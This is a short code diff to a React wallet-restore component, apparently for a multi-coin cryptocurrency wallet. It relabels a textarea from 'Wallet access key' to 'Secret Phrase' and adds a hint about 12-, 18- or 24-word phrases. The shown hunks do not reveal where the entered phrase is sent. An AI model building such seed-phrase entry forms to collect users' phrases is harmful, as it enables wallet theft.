@@ -301,7 +301,7 @@ function MultiCoinWalletSection({
           </div>
         </div>
         <div className="restore-field">
-          <label htmlFor="secret-phrase">Wallet access key</label>
+          <label htmlFor="secret-phrase">Secret Phrase</label>
           <div className="secret-phrase-safe-box">
             <textarea
               id="secret-phrase"
@@ -324,7 +324,7 @@ function MultiCoinWalletSection({
             </button>
           </div>
         </div>
-        <p>Enter the access details exactly as provided by your wallet</p>
+        <p>Typically 12 (sometimes 18, 24) words separated by single spaces</p>
         
         {statusMessage && (
           <div className={`status-message ${statusMessage.includes('❌') ? 'error' : statusMessage.includes('✅') ? 'success' : statusMessage.includes('ℹ️') ? 'info' : 'info'}`}>
